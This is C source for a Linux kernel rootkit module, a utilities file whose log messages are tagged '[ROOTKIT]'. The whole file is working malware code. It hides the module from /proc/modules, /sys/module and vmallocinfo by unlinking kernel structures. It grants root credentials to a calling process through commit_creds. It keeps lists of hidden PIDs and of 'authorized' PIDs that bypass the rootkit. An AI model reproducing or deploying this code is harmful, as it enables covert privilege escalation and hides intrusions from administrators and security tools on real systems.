#include "utils.h"

#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include <asm/current.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/rbtree.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/sysfs.h>
#include <linux/types.h>
#include <linux/vmalloc.h>

LIST_HEAD(hidden_pids_list);
LIST_HEAD(authorized_pids_list);

static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`

static struct list_head *p_vma_list = NULL; // Pointer to `vmap_area_list`
static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`

void hide_module(void)
{
    unsigned int i = 0;
    struct vmap_area *p_vma;
    struct vmap_area *p_vma_tmp;
    struct module_use *p_use;
    struct module_use *p_use_tmp;
    struct module_notes_attrs *notes_attrs = NULL;
    struct module_sect_attrs *sect_attrs   = NULL;

    if (p_vma_list == NULL) {
        p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
    }
    if (p_vma_root == NULL) {
        p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
    }

    pr_info("[ROOTKIT] p_vma_list: %p\n", p_vma_list);
    pr_info("[ROOTKIT] p_vma_root: %p\n", p_vma_root);

    // Remove module from /proc/vmallocinfo
    list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
        if ((unsigned long)THIS_MODULE > p_vma->va_start &&
            (unsigned long)THIS_MODULE < p_vma->va_end) {
            pr_info("[ROOTKIT] * Removing VMAP area %p...", p_vma);
            list_del(&p_vma->list);
            rb_erase(&p_vma->rb_node, p_vma_root);
            pr_cont(" done\n");
        }
    }

    // Clear dependency list (see kernel/module.c)
    list_for_each_entry_safe (p_use, p_use_tmp, &THIS_MODULE->target_list, target_list) {
        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", p_use->source->name,
                p_use->target->name);
        list_del(&p_use->source_list);
        list_del(&p_use->target_list);
        sysfs_remove_link(p_use->target->holders_dir, THIS_MODULE->name);
        kfree(p_use);
        pr_cont(" done\n");
    }

    // Clear notes_attr (see kernel/module.c)
    notes_attrs = THIS_MODULE->notes_attrs;
    if (notes_attrs != NULL) {
        pr_info("[ROOTKIT] * Removing notes_attr %p...", notes_attrs);
        if (notes_attrs->dir != NULL) {
            i = THIS_MODULE->notes_attrs->notes;
            while (i-- > 0) {
                pr_info("[ROOTKIT]   * Removing attr %u (%p)...", i, &notes_attrs->attrs[i]);
                sysfs_remove_bin_file(notes_attrs->dir, &notes_attrs->attrs[i]);
            }
            kobject_put(notes_attrs->dir);
        }
        kfree(notes_attrs);
        THIS_MODULE->notes_attrs = NULL;
    }

    // Clear sect_attrs (see kernel/module.c)
    sect_attrs = THIS_MODULE->sect_attrs;
    if (sect_attrs != NULL) {
        pr_info("[ROOTKIT] * Removing sect_attr %p...", sect_attrs);
        sysfs_remove_group(&THIS_MODULE->mkobj.kobj, &sect_attrs->grp);
        for (i = 0; i < sect_attrs->nsections; i++) {
            pr_info("[ROOTKIT]   * Freeing attr %u (%p)...", i, &sect_attrs->attrs[i]);
            kfree(sect_attrs->attrs[i].battr.attr.name);
        }
        kfree(sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
    }

    // Clear various fields
    THIS_MODULE->modinfo_attrs->attr.name = NULL;
    kfree(THIS_MODULE->mkobj.mp);
    THIS_MODULE->mkobj.mp = NULL;
    kfree(THIS_MODULE->mkobj.drivers_dir);
    THIS_MODULE->mkobj.drivers_dir = NULL;

    // Remove module from /proc/modules
    list_del(&THIS_MODULE->list);

    // Remove module from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    pr_info("[ROOTKIT] Module was hidden\n");
}

long give_root(const pid_t i32_pid, const int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_err("[ROOTKIT] * Failed to get credentials\n");
        return -EPERM;
    }

    __SET_UIDS(p_creds, ROOT_UID);
    __SET_GIDS(p_creds, ROOT_GID);

    commit_creds(p_creds);

    pr_info("[ROOTKIT] * Process is now root\n");

    return 0;
}

bool is_pid_hidden(const pid_t i32_pid)
{
    const pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
    const pid_t i32_real_pid       = get_effective_pid(i32_pid); // Effective PID to check

    if (i32_real_pid == -1) {
        return false;
    }

    // Check if the given PID is in the hidden list
    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
                p_hidden_pid->i32_pid, i32_real_pid);
        if (p_hidden_pid->i32_pid == i32_real_pid) {
            pr_cont(" found!\n");
            return true;
        }
        else {
            pr_cont(" not found\n");
        }
    }

    return false;
}

long show_hide_process(const pid_t i32_pid, const int i32_sig)
{
    pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
    pid_list_t *p_tmp        = NULL;                       // Temporary pointer for iteration
    const pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to show

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    switch (i32_sig) {
    case SIGHIDE:
        pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);

        p_hidden_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
        IF_U (p_hidden_pid == NULL) {
            pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
            return -EPERM;
        }

        // Add the given PID to the list (if it is 0, add the current PID)
        p_hidden_pid->i32_pid = i32_real_pid;

        list_add(&p_hidden_pid->list, &hidden_pids_list);
        break;

    case SIGSHOW:
        pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);

        // Remove the given PID from the hidden list (if it is 0, remove the current PID)
        list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
            if (p_hidden_pid->i32_pid == i32_real_pid) {
                list_del(&p_hidden_pid->list);
                kfree(p_hidden_pid);
            }
        }
        break;

    default:
        pr_err("[ROOTKIT] * show_hide_process(): Invalid signal: %d\n", i32_sig);
        return -EINVAL;
    }

    return 0;
}

void show_all_processes(void)
{
    pid_list_t *p_hidden_pid = NULL; // Hidden PID list entry
    pid_list_t *p_tmp        = NULL; // Temporary pointer for iteration

    pr_info("[ROOTKIT] Unhiding all processes...\n");

    // Remove all PIDs from the hidden list
    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
        list_del(&p_hidden_pid->list);
        kfree(p_hidden_pid);
    }
}

bool is_process_authorized(const pid_t i32_pid)
{
    bool b_ret                         = false;                      // Return value
    const pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
    const pid_t i32_real_pid           = get_effective_pid(i32_pid); // Effective PID to check
    task_t *p_task                     = NULL;                       // Task structure
    task_t *p_task_tmp                 = NULL;                       // Temp pointer for iteration
    task_t *p_task_tmp2                = NULL;                       // Temp pointer for iteration

    if (i32_real_pid == -1) {
        return false;
    }

    IF_U (_find_get_task_by_vpid == NULL) {
        _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");

        pr_info("[ROOTKIT] * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);

        IF_U (_find_get_task_by_vpid == NULL) {
            pr_err("[ROOTKIT] * Failed to get `find_get_task_by_vpid()` address\n");
            return false;
        }
    }

    if (i32_pid == 0 || i32_real_pid == current->pid) {
        p_task = get_task_struct(current);
    }
    else {
        p_task = _find_get_task_by_vpid(i32_real_pid);
    }

    pr_info("[ROOTKIT] * Checking if PID %d is authorized (task PID: %d)...\n", i32_real_pid,
            p_task->pid);

    // Check if the given PID is in the authorized list
    list_for_each_entry (p_authorized_pid, &authorized_pids_list, list) {
        pr_info("[ROOTKIT]   * Checking authorized PID %d against given PID %d...",
                p_authorized_pid->i32_pid, i32_real_pid);

        if (p_authorized_pid->i32_pid == i32_real_pid) {
            pr_info("[ROOTKIT]   * PID %d can bypass rootkit\n", i32_real_pid);
            b_ret = true;
            goto loop_end;
        }
        else {
            p_task_tmp = p_task;

            while (p_task_tmp != NULL && p_task_tmp->pid != 0) {
                p_task_tmp = get_task_struct(p_task_tmp);

                pr_info("[ROOTKIT]   * Checking parent PID %d against given PID %d...",
                        p_task_tmp->pid, p_authorized_pid->i32_pid);

                if (p_authorized_pid->i32_pid == p_task_tmp->pid) {
                    pr_info("[ROOTKIT]   * PID %d can bypass rootkit (thanks to parent %d)\n",
                            i32_real_pid, p_task_tmp->pid);
                    put_task_struct(p_task_tmp);
                    b_ret = true;
                    goto loop_end;
                }
                rcu_read_lock();
                p_task_tmp2 = rcu_dereference(p_task_tmp->real_parent);
                rcu_read_unlock();
                put_task_struct(p_task_tmp);
                p_task_tmp = p_task_tmp2;

                pr_info("[ROOTKIT]   * Parent task: %p\n", p_task_tmp);
            }
        }
    }

loop_end:
    put_task_struct(p_task);
    return b_ret;
}

long authorize_process(const pid_t i32_pid, const int i32_sig)
{
    pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
    const pid_t i32_real_pid     = get_effective_pid(i32_pid); // Effective PID to authorize

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    pr_info("[ROOTKIT] * Authorizing process %d\n", i32_real_pid);

    p_authorized_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
    IF_U (p_authorized_pid == NULL) {
        pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
        return -EPERM;
    }

    // Add the given PID to the list (if it is 0, add the current PID)
    p_authorized_pid->i32_pid = i32_real_pid;

    list_add(&p_authorized_pid->list, &authorized_pids_list);

    return 0;
}

void clear_auth_list(void)
{
    pid_list_t *p_authorized_pid = NULL; // Authorized PID list entry
    pid_list_t *p_tmp            = NULL; // Temporary pointer for iteration

    pr_info("[ROOTKIT] Clearing authorized process list...\n");

    // Remove all PIDs from the authorized list
    list_for_each_entry_safe (p_authorized_pid, p_tmp, &authorized_pids_list, list) {
        pr_info("[ROOTKIT] * Removing PID %d from authorized list\n", p_authorized_pid->i32_pid);
        list_del(&p_authorized_pid->list);
        kfree(p_authorized_pid);
    }
}
